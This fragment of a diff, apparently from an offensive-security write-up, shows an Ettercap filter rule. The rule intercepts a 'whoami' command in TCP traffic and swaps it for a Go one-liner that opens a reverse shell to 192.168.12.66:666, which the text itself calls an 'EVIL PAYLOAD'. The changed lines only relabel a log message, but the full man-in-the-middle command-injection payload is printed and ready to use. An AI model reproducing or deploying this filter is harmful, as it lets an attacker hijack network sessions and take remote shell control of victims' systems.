@@ -824,8 +824,9 @@ echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"t
 if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
     log(DATA.data, "/root/ettercap.log");
     replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
-    msg("###### ETTERFILTER: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL PAYLOAD >'reverse rhell'<). ######\n");
+    msg("###### ETTERFILTER-TEXT: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL PAYLOAD >'reverse rhell'<). ######\n");
 }
+
 
 ```
 
